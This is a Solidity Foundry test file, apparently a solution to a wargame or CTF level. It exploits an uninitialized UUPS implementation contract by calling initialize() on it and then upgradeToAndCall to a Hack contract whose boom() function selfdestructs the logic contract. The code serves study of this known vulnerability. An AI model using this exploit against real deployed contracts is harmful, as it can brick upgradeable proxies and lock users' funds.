// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {UUPSBaseTest} from "./UUPSBase.t.sol";

contract UUPSTest is UUPSBaseTest {
    Hack internal hack;

    function testExploit() external validation {
        hack = new Hack();
        bytes memory data = abi.encodeWithSignature("boom()");
        
        address(logic).call(abi.encodeWithSignature("initialize()"));
        address(logic).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(hack), data));
    }
}

contract Hack {
    function boom() public {
        selfdestruct(payable(address(this)));
    }
}